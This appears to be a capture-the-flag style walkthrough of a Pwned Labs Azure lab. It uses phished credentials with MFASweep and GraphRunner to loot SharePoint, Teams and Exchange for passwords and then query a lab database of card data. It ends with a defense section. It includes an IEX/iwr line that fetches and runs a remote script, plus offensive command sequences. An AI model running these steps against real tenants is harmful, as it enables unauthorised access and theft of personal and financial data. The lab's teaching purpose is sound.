---
title: Loot Exchange, Teams and SharePoint with GraphRunner 
description: Loot Exchange, Teams and SharePoint with GraphRunner 
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
Your red team is on an engagement and has successfully phished a Mega Big Tech employee to gain their credentials. So far increasing access within Azure has reached a dead end, and you have been tasked with unlocking further access. In scope is the entire on-premises and cloud infrastructure. Your goal is to gain access to customer records and demonstrate impact.

# Walkthrough
We are given user credentials, so let's check if MFA is enforced. We can use [MFASweep](https://github.com/dafthack/MFASweep) to enumerate it (There are other tools like [FindMeAccess](https://github.com/absolomb/FindMeAccess)). We can download the script and import it.
```
└─PS> . ./MFASweep.ps1
```
Or use `Invoke-Expression` to execute it
```
IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1')
```

Now let's enumerate the presence of MFA on Microsoft services. We also include a check for Active Directory Federated Services in case it is available
```
└─PS> Invoke-MFASweep -Username Clara.Miller@megabigtech.com -Password MegaBigTech99 -Recon -IncludeADFS
---------------- MFASweep ----------------
---------------- Running recon checks ----------------
[*] Checking if ADFS configured...
[*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft.
<SNIP>
---------------- ADFS Authentication ----------------
[*] Getting ADFS URL...
[*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft.                               
[*] Authenticating to On-Prem ADFS Portal at: 
######### SINGLE FACTOR ACCESS RESULTS #########                                                                                                                                                                                            
Microsoft Graph API                  | YES
Microsoft Service Management API     | YES
M365 w/ Windows UA                   | NO
M365 w/ Linux UA                     | NO
M365 w/ MacOS UA                     | NO
M365 w/ Android UA                   | NO
M365 w/ iPhone UA                    | NO
M365 w/ Windows Phone UA             | NO
Exchange Web Services (BASIC Auth)   | NO
Active Sync (BASIC Auth)             | NO
ADFS                                 | NO
```

We can see that single-factor authentication is enabled for our current user on the Microsoft Graph API and Microsoft Service Management API. Microsoft 365 applications ( Outlook, Teams and SharePoint) rely on the Microsoft Graph API, and this configuration allow us to enumerate and exfiltrate user generated content that might be useful.

Let's check if compromised user has been assigned a Microsoft 365 license. Login into Azure with `Connect-MgGraph` and run the command below.
```
└─PS> Get-MgUserLicenseDetail -UserId "Clara.Miller@megabigtech.com"                                                                                                                                                                        

Id                                          SkuId                                SkuPartNumber
--                                          -----                                -------------
78yQJX1oO0mujUQcurY6chhRVTtq2hhEiU998eIJaHA 3b555118-da6a-4418-894f-7df1e2096870 O365_BUSINESS_ESSENTIALS
```

We see `O365_BUSINESS_ESSENTIALS`, which means that the user has access to Outlook, Teams, SharePoint and other productivity tools.

To find loot in  Microsoft 365 environments, we can use [GraphRunner](https://github.com/dafthack/GraphRunner). Check the following [article](https://www.blackhillsinfosec.com/introducing-graphrunner/) and [Youtube video](https://www.youtube.com/watch?v=o29jzC3deS0&ab_channel=BlackHillsInformationSecurity) about `GraphRunner`. Import the script
```
└─PS> . ./GraphRunner.ps1                                                                                                                                                                                                                   

  ________                     __      _______      by Beau Bullock (@dafthack)
 /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________
/___\  __\______\____\ \_____\|__|__\|________/__|__\/____\ /____\_/____\______\
\    \_\  \  | \// __ \|  |_/ |   Y  \    |   \  |  /   |  \   |  \  ___/|  | \/
 \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|
                 Do service principals dream of electric sheep?                                                                                                                                                                             

For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki                                                                                                                                                       
To list GraphRunner modules run List-GraphRunnerModules                                                                                                                                                                                     
                                                             
```

To list all available modules
```
└─PS> List-GraphRunnerModules                                                                                                                                                                                                               
[*] Listing GraphRunner modules...
-------------------- Authentication Modules -------------------
        MODULE                  -        DESCRIPTION                                                                                                                                                                                        
Get-GraphTokens                 -        Authenticate as a user to Microsoft Graph
Invoke-RefreshGraphTokens       -        Use a refresh token to obtain new access tokens
Get-AzureAppTokens              -        Complete OAuth flow as an app to obtain access tokens
Invoke-RefreshAzureAppTokens    -        Use a refresh token and app credentials to refresh a token
Invoke-AutoTokenRefresh -        Refresh tokens at an interval.
----------------- Recon & Enumeration Modules -----------------
        MODULE                  -        DESCRIPTION                                                                                                                                                                                        
Invoke-GraphRecon               -        Performs general recon for org info, user settings, directory sync settings, etc
Invoke-DumpCAPS                 -        Gets conditional access policies
Invoke-DumpApps                 -        Gets app registrations and external enterprise apps along with consent and scope info
Get-AzureADUsers                -        Gets user directory
Get-SecurityGroups              -        Gets security groups and members
Get-UpdatableGroups             -        Gets groups that may be able to be modified by the current user
Get-DynamicGroups               -        Finds dynamic groups and displays membership rules
Get-SharePointSiteURLs          -        Gets a list of SharePoint site URLs visible to the current user
Invoke-GraphOpenInboxFinder     -        Checks each user's inbox in a list to see if they are readable
Get-TenantID                    -        Retrieves the tenant GUID from the domain name    
<SNIP>
```

For our case `Pillage` modules look interesting.
```
----------------------- Pillage Modules -----------------------
        MODULE                  -        DESCRIPTION
Invoke-SearchSharePointAndOneDrive      -        Search across all SharePoint sites and OneDrive drives visible to the user
Invoke-ImmersiveFileReader      -        Open restricted files with the immersive reader
Invoke-SearchMailbox            -        Deep searches across a user's mailbox and can export messages
Invoke-SearchTeams              -        Search all Teams messages in all channels that are readable by the current user
Invoke-SearchUserAttributes     -        Search for terms across all user attributes in a directory
Get-Inbox                       -        Gets inbox items
Get-TeamsChat                   -        Downloads full Teams chat conversations     
```

Now get a session with Microsoft Graph API using [Get-GraphTokens](https://github.com/dafthack/GraphRunner/wiki/Authentication#get-graphtokens)
```
└─PS> Get-GraphTokens
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code SJJD3EZ67 to authenticate.
authorization_pending                                                                                                                                                                                                                       
authorization_pending                                                                                                   
authorization_pending                                                                                                   
authorization_pending                                                                                                   
authorization_pending                                                                                                   
authorization_pending                                                                                                   
authorization_pending                                                                                                   
authorization_pending                                                                                                   
Decoded JWT payload:

aud                 : https://graph.microsoft.com
iss                 : https://sts.windows.net/2590ccef-687d-493b-ae8d-441cbab63a72/
iat                 : 1756827172
nbf                 : 1756827172
exp                 : 1756832807
<SNIP>
[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)
[!] Your access token is set to expire on: 09/02/2025 23:06:47  
```

We can start with `Invoke-SearchSharePointAndOneDrive`. To see examples for any module with the `Get-Help` followed by the module name and the `-examples` parameter
```
└─PS> Get-Help Invoke-SearchSharePointAndOneDrive -examples                                                                                                                                                                                 

NAME
    Invoke-SearchSharePointAndOneDrive
    
SYNOPSIS
    This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.   
    Author: Beau Bullock (@dafthack)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None
    
    
    -------------------------- EXAMPLE 1 --------------------------
    
    C:\PS>Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password filetype:xlsx'
    -----------
    This will search through the all SharePoint and OneDrive drives accessible to the current user for the term password.

```

Let's look for file containing the string `password`
```
└─PS> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'                                                                                                                                                             
[*] Using the provided access tokens.
[*] Found 2 matches for search term password                                                                                                                                                                                                
Result [0]                                                                                                                                                                                                                                  
File Name: passwords.xlsx
Location: https://iancloudpwned.sharepoint.com/Shared Documents/passwords.xlsx
Created Date: 03/27/2024 00:13:10
Last Modified Date: 04/24/2025 14:49:38
Size: 14.78 KB
File Preview: <ddd/><c0>Password</c0> Azure lindsey_adm <REDACTED> Dev Env r&d <REDACTED> Lindsey.<ddd/>
DriveID & Item ID: b!bT4vhymq0UWW7LvQnMzGLIicHuknVeZGkE3-8tuCtaeO-nKW9TKYT7NHHw0ABSux\:017K7QPLPAKVIRHIULQ5BK6A3KQTCK2SCD
================================================================================
Result [1]
File Name: Finance Logins.docx
Location: https://iancloudpwned.sharepoint.com/sites/FinanceTeam/Shared Documents/Finance Logins.docx
Created Date: 11/06/2023 00:17:46
Last Modified Date: 11/06/2023 00:17:00
Size: 20.74 KB
File Preview: <ddd/><c0>PASSWORDS</c0>) Service/Account: Finance Database URL: https://10.10.11.15/login Username: <ddd/> <c0>Password</c0>: <REDACTED> Service/Account: Accounting Software URL: https://accounting.<ddd/>
DriveID & Item ID: b!XM0yHkS8s0KPA7drboV7c7bd4PO1jD1BpS2fN8axCu6HW_Ya2jEcSZSebeuGuDsI\:01UALFMSZAKNKICFDDHRH2II4AID3NQRGJ
================================================================================
[*] Do you want to download any of these files? (Yes/No/All)
yes
[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"
0
[*] Now downloading passwords.xlsx
[*] Do you want to download any more files? (Yes/No/All)                                                                                                                                                                                    
No
[*] Quitting...
```

> If you receive the error `TooManyRequests`, this is due to Microsoft Graph request throttling. Further information on this can be found in [Microsoft's documentation](https://learn.microsoft.com/en-us/graph/throttling). The tool's author, dafthack, has also acknowledged that this can sometimes be an [issue](https://github.com/dafthack/GraphRunner/issues/9). If you do see this, then the error includes the line number from `GraphRunner.ps1` that encountered the issue - in this case line `6741`. Looking at the code, we see that seems this stems from the request below.
{: .prompt-info }

```
    $access_token = $tokens.access_token
    $itemarray = $driveitemids.split(":")
    $downloadUrl = ("https://graph.microsoft.com/v1.0/drives/" + $itemarray[0] + "/items/" + $itemarray[1] + "/content")
    $downloadheaders = @{
    "Authorization" = "Bearer $access_token"
    "User-Agent" = $UserAgent
    }
    Write-Host -ForegroundColor yellow "[*] Now downloading $FileName"
    Invoke-RestMethod -Uri $downloadUrl -Headers $downloadheaders -OutFile $filename
}
```

The only variable that can be changed in this request is the `User Agent`. In this case, we can authenticate again using the `Get-GraphTokens` cmdlet with the `-Device` and `-Browser` parameters. For example - `Get-GraphTokens -Device AndroidMobile -Browser Android`.

The files contain credentials that can give access to very sensitive systems and data, which also potentially can grant access to the underlying servers ( in case there are any abusable functionalities, such as file uploads or known application vulnerabilities).

![](loot-exchange-teams-sharepoint-with-graphrunner-1.png)

![](loot-exchange-teams-sharepoint-with-graphrunner-2.png)

Let's continues searching other sensitive data
```
└─PS> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'
[*] Using the provided access tokens.
[*] Found 1 matches for search term bonus
Result [0]
File Name: Bonuses - Confidential.xlsx
Location: https://iancloudpwned-my.sharepoint.com/personal/sam_olsson_megabigtech_com/Documents/Bonuses - Confidential.xlsx
Created Date: 11/05/2023 21:50:58
Last Modified Date: 11/05/2023 21:50:58
Size: 17.50 KB
File Preview: 
DriveID & Item ID: b!qFVO5o9Td0OqTdtkAzLcOeLC9xqzoSxNgtanvmZOWlEk66ey-hWeTL_LW84ry4xf\:01LMH7HCXMTDF5WDES3ZF3IDWGRV2P4OXB
================================================================================
[*] Do you want to download any of these files? (Yes/No/All)
Yes
[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"
0
[*] Now downloading Bonuses - Confidential.xlsx
[*] Do you want to download any more files? (Yes/No/All)
No
[*] Quitting...
```

The file is password protected

![](loot-exchange-teams-sharepoint-with-graphrunner-3.png)

Let's continue investigating other Microsoft 365 services. For example, Teams service is commonly used by organizations, thus we can use the `Invoke-SearchTeams`  to search all Teams messages in all channels that are readable by the current user, as well as notes/chat that the user sends to themselves...
```
└─PS> Invoke-SearchTeams -Tokens $tokens -SearchTerm password
[*] Using the provided access tokens.
[*] Refreshing token for Teams use...
From: Clara.Miller@megabigtech.com | Summary: password: <REDACTED
Full Message Body: <html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>password: <REDACTED</p></body></html>
================================================================================
From: Clara.Miller@megabigtech.com | Summary: Call IT to reset my password for accounting system
Full Message Body: <html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>Call IT to reset my password for accounting system</p></body></html>
================================================================================
From: Clara.Miller@megabigtech.com | Summary: Call IT to reset my password for accounting system
Full Message Body: <html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>Call IT to reset my password for accounting system</p></body></html>
================================================================================
From: Clara.Miller@megabigtech.com | Summary: password: <REDACTED
Full Message Body: <html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body><p>password: <REDACTED</p></body></html>
================================================================================
```

We find a password, which works against protected document

![](loot-exchange-teams-sharepoint-with-graphrunner-4.png)

Let's continue investigation with emails and try searching for mailbox of our user
```
└─PS> Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40                                                                                                                                                          
[*] Using the provided access tokens.
[*] Found 5 matches for search term password
Subject: Subscribers database | Sender: /O=EXCHANGELABS/OU=EXCHANGE ADMINISTRATIVE GROUP (FYDIBOHF23SPDLT)/CN=RECIPIENTS/CN=EF775FA670FB409789970E587F6F4F04-36FA333D-17 | Receivers: Sam Olsson | Date: 11/06/2023 17:24:50 | Message Preview: ...login below: Username: financereports Password: $reporting$123 Server: mbt-finance.database.windows.net Database: Finance Clara ...
================================================================================
[*] Do you want to download these emails and their attachments? (Yes/No)
No
[*] Quitting...

```

We can see from the preview the credentials for a Finance database. The subdomain `database.windows.net`, which is [Azure SQL database](https://learn.microsoft.com/en-us/azure/azure-sql/database/sql-database-paas-overview?view=azuresql). According to documentation states that Azure SQL databases are based on the latest stable version of the Microsoft SQL Server database engine.
```
Username: financereports
Password: $reporting$123
Server: mbt-finance.database.windows.net
Database: Finance
```

We can interact with the database using PowerShell, thus create a connection. To close the connection, `$conn.Close()`
```
$conn = New-Object System.Data.SqlClient.SqlConnection
$password='$reporting$123'
$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=financereports;Password=$password;"
$conn.Open()
```

Then, we can start enumerating
```
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables
```
We see `Subscribers` table.
```
└─PS> $data.Tables

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME  TABLE_TYPE
------------- ------------ ----------  ----------
Finance       dbo          Subscribers BASE TABLE
```

Let's query the data. 
```
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM Subscribers;"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables | ft
```
```
└─PS> $data.Tables | ft

SubscriberID                         CardNumber       ExpiryDate            CVV FullName                               BirthDate
------------                         ----------       ----------            --- --------                               ---------
ebb7c066-b630-4794-9d3a-06451a685b65 4532756279624064 12/1/2025 12:00:00 AM 123 Alex Smith                             6/15/1990 12:00:00 AM
d4148d1d-f65e-45da-93fe-a47e39fa011b 5399832489200328 11/1/2023 12:00:00 AM 311 Jamie Doe                              3/22/1982 12:00:00 AM
076409fd-f8c6-4bd2-ac63-f38eb3245414 6011169726455487 1/1/2024 12:00:00 AM  667 Casey Johnson                          9/5/1975 12:00:00 AM
72394343-72ea-4c69-b3af-83609a7a22e3 4539588563664805 7/1/2025 12:00:00 AM  542 Jordan Bennett                         11/8/1992 12:00:00 AM
94f24f3a-e5c8-4708-a581-57557c6007cd 4024007137761885 12/1/2023 12:00:00 AM 234 Taylor Young                           4/16/1987 12:00:00 AM
<SNIP>
```

We see that the personally identifiable information (PII) of subscribers have not been protected, as their financial and personal information haven't been encrypted.

# Defense
This part is from [lab's defense section](https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner)

There are few issues:
- Lack of MFA on logging on to Microsoft 365 and Azure. 
  - Allows enumeration of the license details and access various services, including Teams, Email (Exchange) SharePoint and OneDrive. 
- There were credentials, passwords and sensitive details in the email, documents, chat. 
  - This unlocked access to several critical financial systems, including an Azure SQL database that contained customer subscription details, including financial data. 
- Public access to database. 
  - Increases the risk of someone successfully brute forcing the database login details, or gaining credentials and being able to access it. 
  - Better to estrict network access to only the IP addresses or ranges that require it.